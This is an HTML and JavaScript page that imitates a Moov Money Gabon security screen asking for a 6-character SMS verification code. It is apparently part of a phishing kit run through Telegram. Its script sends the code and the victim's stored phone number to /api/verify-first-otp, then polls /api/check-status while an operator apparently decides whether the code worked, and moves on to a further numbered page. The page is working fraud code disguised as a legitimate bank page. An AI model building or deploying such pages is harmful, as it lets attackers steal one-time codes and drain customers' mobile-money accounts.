<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Moov Money Gabon - Sécurité</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --moov-orange: #ff6600;
            --moov-blue: #0047ab;
            --moov-hover: #e05a00;
            --bg-color: #f0f4f8;
            --card-bg: #ffffff;
            --text-main: #1e293b;
            --text-muted: #64748b;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        /* Top Header Navigation Bar */
        .app-header {
            width: 100%;
            background: linear-gradient(135deg, var(--moov-blue), #1e3a8a);
            height: 65px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: sticky;
            top: 0;
            z-index: 100;
            border-bottom: 3px solid var(--moov-orange);
        }

        .header-title {
            display: flex;
            align-items: center;
            font-size: 22px;
            font-weight: 800;
            color: white;
        }

        .header-title .moov { color: var(--moov-orange); margin-right: 6px; }
        .header-title .money { color: #ffffff; }

        /* Full-Screen Card Layout */
        .card {
            background: var(--card-bg);
            width: 92%;
            max-width: 440px;
            margin: 30px auto;
            padding: 35px 20px;
            border-radius: 20px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
            display: flex;
            flex-direction: column;
            flex-grow: 1;
            justify-content: center;
        }

        .main-title {
            font-size: 26px;
            color: var(--text-main);
            margin: 0 0 10px;
            text-align: center;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        .subtext {
            font-size: 14px;
            color: var(--text-muted);
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        /* Perfectly Sized 6-Digit Alphanumeric Code Input Grid */
        .code-input-container {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-bottom: 25px;
            width: 100%;
        }

        .code-box {
            width: 46px;
            height: 56px;
            border: 2px solid var(--moov-blue);
            border-radius: 10px;
            text-align: center;
            font-size: 22px;
            font-weight: 800;
            outline: none;
            text-transform: uppercase;
            color: var(--text-main);
            background-color: #f8fafc;
            transition: all 0.2s;
        }

        .code-box:focus {
            border-color: var(--moov-orange);
            background-color: #ffffff;
            box-shadow: 0 0 8px rgba(255, 102, 0, 0.25);
            transform: scale(1.03);
        }

        /* Error Message Banner */
        .error-message {
            background-color: #fee2e2;
            color: #dc2626;
            border: 1px solid #fecaca;
            padding: 12px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 25px;
            text-align: center;
            display: none;
        }

        /* Action Button */
        .submit-btn {
            width: 100%;
            background-color: #cbd5e1;
            color: #ffffff;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 800;
            cursor: not-allowed;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            transition: background-color 0.2s;
        }

        .submit-btn.active {
            background-color: var(--moov-orange);
            cursor: pointer;
        }

        .submit-btn.active:hover {
            background-color: var(--moov-hover);
        }

        /* Footer Banner */
        .footer-banner {
            width: 100%;
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: var(--text-muted);
            margin-top: auto;
        }
    </style>
</head>
<body>

<!-- Header Navigation Bar -->
<div class="app-header">
    <div class="header-title">
        <span class="moov">Moov</span><span class="money">Money</span>
    </div>
</div>

<!-- Main Full-Screen Card Container -->
<div class="card">
    <h1 class="main-title">Code de Confirmation</h1>
    <p class="subtext">
        Veuillez entrer le code de vérification à 6 caractères reçu par SMS sur votre numéro Moov Money.
    </p>

    <div id="errorText" class="error-message">Code incorrect ou expiré. Veuillez réessayer.</div>

    <!-- 6-Character Code Entry Boxes -->
    <div class="code-input-container">
        <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
        <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
        <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
        <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
        <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
        <input type="text" maxlength="1" class="code-box" autocomplete="off" spellcheck="false">
    </div>

    <button id="submitBtn" class="submit-btn" disabled>VALIDER</button>
</div>

<!-- Footer -->
<div class="footer-banner">
    © 2026 Moov Money Gabon
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const boxes = document.querySelectorAll('.code-box');
    const submitBtn = document.getElementById('submitBtn');
    const errorText = document.getElementById('errorText');

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }

    boxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            if (box.value && index < boxes.length - 1) {
                boxes[index + 1].focus();
            }
            const code = Array.from(boxes).map(b => b.value).join('');
            submitBtn.disabled = code.length < 6;
            submitBtn.classList.toggle('active', code.length === 6);
            errorText.style.display = 'none';
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) {
                boxes[index - 1].focus();
            }
        });

        box.addEventListener('paste', (e) => {
            e.preventDefault();
            const pasteData = (e.clipboardData || window.clipboardData)
                .getData('text')
                .toUpperCase()
                .replace(/[^A-Z0-9]/g, '');

            if (pasteData.length > 0) {
                boxes.forEach((b, i) => {
                    b.value = pasteData[i] || '';
                });
                const focusIndex = Math.min(pasteData.length, boxes.length - 1);
                boxes[focusIndex].focus();
            }
            const code = Array.from(boxes).map(b => b.value).join('');
            submitBtn.disabled = code.length < 6;
            submitBtn.classList.toggle('active', code.length === 6);
        });
    });

    submitBtn.addEventListener('click', async () => {
        if (submitBtn.disabled) return;

        const code = Array.from(boxes).map(b => b.value).join('');
        const phone = localStorage.getItem('phone');

        submitBtn.disabled = true;
        submitBtn.innerText = "Vérification...";

        try {
            const res = await fetch('/api/verify-first-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone, code })
            });
            const data = await res.json();
            if (data.success) {
                const pollInterval = setInterval(async () => {
                    const statusRes = await fetch(`/api/check-status?phone=${phone}`);
                    const s = await statusRes.json();
                    
                    if (s.status === "otp1_correct") {
                        clearInterval(pollInterval);
                        window.location.href = "/page9.html";
                    } else if (s.status === "otp1_wrong") {
                        clearInterval(pollInterval);
                        errorText.style.display = "block";
                        submitBtn.disabled = false;
                        submitBtn.innerText = "VALIDER";
                        boxes.forEach(b => b.value = "");
                        boxes[0].focus();
                    }
                }, 2000);
            }
        } catch (e) {
            submitBtn.disabled = false;
            submitBtn.innerText = "VALIDER";
        }
    });
});
</script>
</body>
</html>
